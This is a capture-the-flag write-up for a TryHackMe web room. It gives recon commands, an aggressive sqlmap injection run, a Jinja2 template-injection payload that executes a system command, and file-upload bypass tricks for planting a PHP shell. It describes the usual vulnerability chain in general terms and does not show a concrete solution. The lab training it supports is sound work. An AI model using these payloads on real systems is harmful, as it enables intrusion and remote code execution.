# 🎯 Recruit Web Challenge

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Recruit Web Challenge](https://tryhackme.com/room/recruitwebchallenge) |
| **Difficulty** | 🔴 Hard |
| **Category** | Web |
| **Tools** | Burp Suite, ffuf, sqlmap, custom scripts |

---

## 🎯 Objective
A recruitment-themed web challenge requiring chaining multiple web vulnerabilities to achieve full compromise.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV -p- TARGET_IP

# Full web enumeration
ffuf -u http://TARGET_IP/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -mc 200,201,301,302,403
```

---

## 💥 Exploitation Chain

Web challenges of this difficulty typically require chaining:

1. **Information Disclosure** — find hidden endpoints, source code, or credentials
2. **Authentication Bypass** — bypass login via SQLi, IDOR, or logic flaws
3. **Privilege Escalation** — escalate from regular user to admin
4. **Code Execution** — achieve RCE via file upload, SSTI, or command injection

```bash
# SQL injection testing
sqlmap -u "http://TARGET_IP/login" --data="user=admin&pass=test" \
  --level=5 --risk=3 --dbs

# SSTI testing
# Input: {{7*7}} → if output is 49, SSTI confirmed
# Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# File upload bypass
# Change Content-Type: image/jpeg
# Double extension: shell.php.jpg
# Null byte: shell.php%00.jpg
```

---

## 📚 Lessons Learned
- Complex web challenges require systematic enumeration before exploitation
- Vulnerability chaining is more common in real engagements than single-vector attacks
- Always test input fields for multiple vulnerability classes simultaneously
- Document each step — tracking what works and what doesn't is essential for complex challenges

---
*by OwlRC 🦉 | github.com/OwlRC*
